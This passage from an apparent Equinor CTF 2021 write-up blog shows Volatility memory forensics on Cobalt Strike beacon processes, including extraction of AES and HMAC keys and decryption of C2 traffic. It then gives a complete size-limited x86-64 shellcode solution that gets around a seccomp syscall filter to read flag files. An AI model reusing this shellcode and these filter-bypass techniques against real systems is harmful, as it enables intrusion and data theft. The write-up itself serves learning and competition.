PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x0000000000720000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000720010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000720020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000720030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000720000 0000 ADD [EAX], AL 0x0000000000720002 0000 ADD [EAX], AL 0x0000000000720004 0000 ADD [EAX], AL 0x0000000000720006 0000 ADD [EAX], AL 0x0000000000720008 0000 ADD [EAX], AL 0x000000000072000a 0000 ADD [EAX], AL 0x000000000072000c 0000 ADD [EAX], AL 0x000000000072000e 0000 ADD [EAX], AL 0x0000000000720010 0000 ADD [EAX], AL 0x0000000000720012 0000 ADD [EAX], AL 0x0000000000720014 0000 ADD [EAX], AL 0x0000000000720016 0000 ADD [EAX], AL 0x0000000000720018 0000 ADD [EAX], AL 0x000000000072001a 0000 ADD [EAX], AL 0x000000000072001c 0000 ADD [EAX], AL 0x000000000072001e 0000 ADD [EAX], AL 0x0000000000720020 0000 ADD [EAX], AL 0x0000000000720022 0000 ADD [EAX], AL 0x0000000000720024 0000 ADD [EAX], AL 0x0000000000720026 0000 ADD [EAX], AL 0x0000000000720028 0000 ADD [EAX], AL 0x000000000072002a 0000 ADD [EAX], AL 0x000000000072002c 0000 ADD [EAX], AL 0x000000000072002e 0000 ADD [EAX], AL 0x0000000000720030 0000 ADD [EAX], AL 0x0000000000720032 0000 ADD [EAX], AL 0x0000000000720034 0000 ADD [EAX], AL 0x0000000000720036 0000 ADD [EAX], AL 0x0000000000720038 0000 ADD [EAX], AL 0x000000000072003a 0000 ADD [EAX], ALZ 0x000000000072003e 0000 ADD [EAX], AL Process: smartscreen.ex Pid: 5576 Address: 0x2491b920000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x000002491b920000 48 89 54 24 10 48 89 4c 24 08 4c 89 44 24 18 4c H.T$.H.L$.L.D$.L 0x000002491b920010 89 4c 24 20 48 8b 41 28 48 8b 48 08 48 8b 51 50 .L$.H.A(H.H.H.QP 0x000002491b920020 48 83 e2 f8 48 8b ca 48 b8 60 00 92 1b 49 02 00 H...H..H.`...I.. 0x000002491b920030 00 48 2b c8 48 81 f9 70 0f 00 00 76 09 48 c7 c1 .H+.H..p...v.H.. --- snip --- We note that both of them have the PAGE_EXECUTE_READWRITE set, which is what we saw in the beacon configuration, so we quickly dump the memory of these processes:\n$ vol -f LA-FLAMA-BLANCA-20211025-071559.raw --profile Win10x64_19041 memdump -D ./memdumps -p 3452 $ vol -f LA-FLAMA-BLANCA-20211025-071559.raw --profile Win10x64_19041 memdump -D ./memdumps -p 5576 $ ls ./memdumps 3452.dmp 5576.dmp Extract Keys By using cs-extract-key.py we can easily parse these memory dumps and extract the AES keys within them (if they exist).\nThe script will not be able to find any keys if you run it as-is, Didier notes this in his post:\nThis method does not always work: the metadata is overwritten after some time, so the process dump needs to be taken quickly after the beacon is started. And there are also cases were this metadata can not be found (I suspect this is version bound).\nThe tools includes an options to perform a dictionary attack if you provide it a callback payload. The tool then extracts all possible AES and HMAC keys from the process dump and tries to authenticate and decrypt the callback. The callback payload can be found in TCP stream 117 from the PCAP.\nI somehow messed up this step, but my teammate, @UnblvR, managed to extract the key successfully from the svchost.exe process and decrypt the traffic:\n$ python cs-extract-key.py -c 000000403c328a67f95f9f2f4d2ed72853369bc476eff4234d932a569a3d22d852dc453e7c22d12f6bc461f2adca8c448a85c5b26204522c2fe327af7d608acc27e4333f ./memdumps/3452.dmp File: ./memdumps/3452.dmp AES key position: 0x0002a440 AES Key: f55fdb402eb483720fe7ca64f1a8a4cf HMAC key position: 0x0002a450 HMAC Key: ad5584fe824cad1d6b839860c88df785 Side note: My attempts resulted in an empty output, most likely due to the callback being messed up.\nDecrypt C2 Communication The final step is to use these extracted keys to decrypt the C2 communication. This is easily done by using the tool (cs-parse-http-traffic.py) we found earlier. With the Wireshark filter we created earlier we can be sure to only attempt to decrypt the encrypted payloads. After letting the script run for a bit, we finally see the flag in the last decrypted payload (Packet number: 156656).\n$ python cs-parse-http-traffic.py -k ad5584fe824cad1d6b839860c88df785:f55fdb402eb483720fe7ca64f1a8a4cf -Y \u0026#39;ip.addr == 172.16.32.2 and http.request.uri matches \u0026#34;/submit.php*\u0026#34;\u0026#39; LA-FLAMA-BLANCA-20211025-071559.pcap Packet number: 143669 HTTP request http://172.16.32.2/submit.php?id=1011624348 Counter: 2 Callback: 30 UNKNOWN la-flama-blanca\\kennyp Extra packet data: b\u0026#39;\u0026#39; Packet number: 156050 HTTP request http://172.16.32.2/submit.php?id=1011624348 Counter: 3 Callback: 30 UNKNOWN User name KennyP Full Name Comment User\u0026#39;s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 9/29/2021 2:15:34 AM Password expires Never Password changeable 9/29/2021 2:15:34 AM Password required No User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 10/25/2021 12:12:52 AM Logon hours allowed All Local Group Memberships *Administrators *Users Global Group memberships *None The command completed successfully. Extra packet data: b\u0026#39;\u0026#39; Packet number: 156656 HTTP request http://172.16.32.2/submit.php?id=1011624348 Counter: 4 Callback: 0 UNKNOWN ---------------------------------------------------------------------------------------------------- flag EPT{d3crypt1ng_c0b4lt_str1k3_tnx_2_d1d13r} Modern\\ SystemShared\\ TIP\\ ---------------------------------------------------------------------------------------------------- Extra packet data: b\u0026#39;\u0026#39; Flag: EPT{d3crypt1ng_c0b4lt_str1k3_tnx_2_d1d13r}\nShellcoding 🔥 Shellcoding 0x05 🔥 This one is a bit different from the others. The flag is in one of 200 files that are randomly created in /opt/flag/. You need to find and print the flag. The files are recreated every minute using the script generateFiles.py which is attached. I\u0026#39;ve also disabled execv and fork syscalls using seccomp. GL HF! :) As the description says, in this challenge the flag is hidden inside 1 out of 200 randomly named files. Moreover, the shellcode is limited to 70 bytes, and the entire directory of random files is regenerated every minute. Syscalls are also severely restricted, to not let us do anything fancy like 2-stage payloads or creating more space.\nvoid disableSyscalls() { scmp_filter_ctx ctx; ctx = seccomp_init(SCMP_ACT_ALLOW); seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0); seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0); seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(fork), 0); seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(vfork), 0); seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(mprotect), 0); seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(mmap), 0); seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(brk), 0); seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(munmap), 0); seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(mremap), 0); seccomp_load(ctx); } The file randomization is done through a Python script, which is using the insecure random module to figure out the names. Exploiting this is a harder problem than just solving the challenge, as we need the outputs in order to predict outputs, so this makes no sense to attack.\nOur general plan is to do something like\nopen(\u0026#34;/opt/flag\u0026#34;) lseek(fd) to skip \u0026#34;.\u0026#34; and \u0026#34;..\u0026#34;\u0026#34; getdents(fd) open(file) sendfile(fd) The string /opt/flag already exists inside the binary through the string \u0026quot;The flag somewhere in /opt/flag\u0026quot;, so that is easy enough.\n/* open(\u0026#34;/opt/flag\u0026#34;) */ pop rdi add di, 2779 mov al, 2 syscall seekdir() just calls lseek() anyways, so let\u0026rsquo;s just go straight to the source and skip a certain number of entries. We dynamically change this OFFSET to a number (explained later), to skip past the uninteresting directory entries in the start. Note that since stdin is closed, the open() syscall is given fd=0.\n/* lseek(0, OFFSET, 0) */ xor eax, eax mov al, 8 xor edi, edi xor esi, esi mov esi, OFFSET xor edx, edx syscall Next up is getdents() to fetch the directory entry from OFFSET into $RSP (valid pointer to the stack), pretending we have 100 bytes to write there.\n/* getdents(0, rsp, 100) */ xor eax, eax mov al, 78 xor edi, edi mov rsi, rsp xor edx, edx mov dl, 100 syscall Now we need to extract the file contents. The structure we just wrote into $RSP looks like this\nstruct linux_dirent { unsigned long d_ino; /* Inode number */ unsigned long d_off; /* Offset to next linux_dirent */ unsigned short d_reclen; /* Length of this linux_dirent */ char d_name[]; /* Filename (null-terminated) */ /* length is actually (d_reclen - 2 - offsetof(struct linux_dirent, d_name)) */ /* char pad; // Zero padding byte char d_type; // File type (only since Linux // 2.6.4); offset is (d_reclen - 1) */ } and we\u0026rsquo;re only interested in d_name, so we have to skip past the other fields (8+8+2=18 bytes). Let\u0026rsquo;s do openat() and access the potential flag file as a descriptor, so it can be sent with sendfile() later.\n/* openat(linux_dirent-\u0026gt;d_name, 0, 0) */ mov ax, 257 lea rsi, [rsp+18] xor edx, edx syscall The final piece of the exfiltration puzzle, is to actually transfer the contents. sendfile() can do this.\n/* sendfile(1, fd_from_openat, 0, 200) */ mov esi, eax xor eax, eax mov al, 40 xor edi, edi inc edi mov r10b, 200 syscall And that\u0026rsquo;s where we ran out of bytes. We now have the contents of one file, but it will take a long time before the first file will contain the flag file, and since this is a 🔥-challenge, time is of the essence. Cue the reason why we made OFFSET a variable. It is possible to combine this script with another one that tells us the offset to the next file.\nThe new code does everything the same way as the previous blocks, except it replaces openat()+sendfile() with this:\n/* write(1, linux_dirent-\u0026gt;d_off, 8) */ xor eax, eax inc eax xor edi, edi inc edi lea rsi, [rsp+8] xor edx, edx mov dl, 8 syscall Which sends us the offset to the next file structure. We can then feed this offset back into the other script to fetch the contents of the next file, then repeat this over and over. It manages to read quite a lot of files before the 1-minute reset happens, so after just a few minutes we get lucky enough to get the flag.\nimport subprocess import sys curr = eval(sys.argv[1]) if len(sys.argv) \u0026gt; 1 else 0 while True: soln = subprocess.check_output([\u0026#39;python3\u0026#39;, \u0026#39;get_filedata.py\u0026#39;, str(curr)]) print(repr(soln)) if soln.startswith(b\u0026#39;EPT\u0026#39;): sys.exit() off = subprocess.check_output([\u0026#39;python3\u0026#39;, \u0026#39;print_offset.py\u0026#39;, str(curr)]) print(off) curr = eval(off) After around 9 minutes, the flag is exfiltrated\nFlag: EPT{y0u_ar3_th3_master_0f_sh3llc0de}\n","permalink":"https://bootplug.io/posts/ctf/equinorctf/","summary":"Misc 🔥 Kalk 🔥 Author: null\nDescription: I heard you needed a new calculator for your math course? Why buy a new one when you can just use my Calculator-as-a-Service instead!\nnc io.ept.gg 30046\nWe get a Python script to download:\n#!/usr/bin/env python3 import dis import os class Math(dict): def __init__(self): self.e = 0 self.pi = 0 def kalk(src, locals): if \u0026#39;=\u0026#39; in src: co = compile(src, \u0026#34;kalk\u0026#34;, \u0026#34;single\u0026#34;) for opc in dis.","title":"Equinor CTF 2021"}]